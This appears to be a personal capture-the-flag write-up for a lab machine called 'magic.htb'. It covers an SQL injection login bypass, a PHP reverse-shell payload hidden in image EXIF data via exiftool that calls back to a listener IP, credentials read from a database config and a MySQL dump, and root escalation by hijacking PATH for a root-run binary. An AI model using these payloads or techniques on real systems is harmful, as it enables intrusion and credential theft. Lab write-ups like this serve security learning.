- Did nmap two ports open 22 80 running apache
- on 80 there was an image hosting service that allowed upload only on login
- logged in using sql injection on username as admin'# and password whatever
- Used exiftool to inject php code in exif data (metadata basically).
- Command used was exiftool -Comment="<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.10.15.217/4444 0>&1'\"); ?>" 6.php.jpg
- I knew uploads went to http://magic.htb/images/uploads/6.php.jpg
- Got shell as www-data
- There were two users in total root and theseus
- theseus's password was in a php db script
- <?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
- Cannot login using this pwd in ssh
- ran mysqldump -u theseus -p iamthekingtheseus Magic and got admin login password
- which was 'admin','Th3s3usW4sK1ng'
- could su as theseus.
- Generated ssh key and added it to his directory.
- ran strings on sysinfo bin (looked shady in linenum)
- saw that is was running another bin lshw as root
- made my own lshw in /tmp/cos put a reverse shell in it and added /tmp/cos in $PATH 
- ran sysinfo and caught reverse shell as root
- PWND BITCH
